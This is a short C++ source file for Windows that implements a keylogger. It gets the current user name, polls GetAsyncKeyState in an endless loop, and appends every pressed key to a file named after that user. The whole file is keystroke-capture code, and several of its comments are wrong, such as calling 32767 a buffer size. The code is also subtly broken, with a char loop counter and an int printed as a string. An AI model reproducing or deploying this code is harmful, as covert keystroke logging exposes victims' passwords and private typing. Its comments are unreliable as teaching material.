#include <iostream>
#include <Windows.h>
#include <Lmcons.h>

using namespace std;

//key is the letter being pressed

//Test to see in Github



int Save(int _key, char *file){ //* converts the string into a char

    cout << _key << endl; //Inserts a new line with each character pressed, key is the ID number

    FILE *OUTPUT_FILE;

    OUTPUT_FILE = fopen(file, "a+"); //fopen is to open the file and a+ is to write (append) at the end of the file
    fprintf(OUTPUT_FILE, "%s", &_key); //print to the file, %s denotes a string
    fclose(OUTPUT_FILE); //close the file

    return 0;
}

int main()
{

    char acUserName[100]; //A char array is the same as a string
    DWORD nUserName = sizeof(acUserName); //DWORD is double word, 32-bit integer
    if (GetUserName(acUserName, &nUserName)){
        cout << acUserName << endl;
    }

    char i;

    while (true){
        for(i = 8; i <= 255; i++){ //Just the way it is, will need to do more research into it
            if (GetAsyncKeyState(i) == -32767){ //32767 is a buffer size
                Save(i, acUserName); //update this where you can call the name of the log after the system user name
            }
        }
    }

    return 0;
}
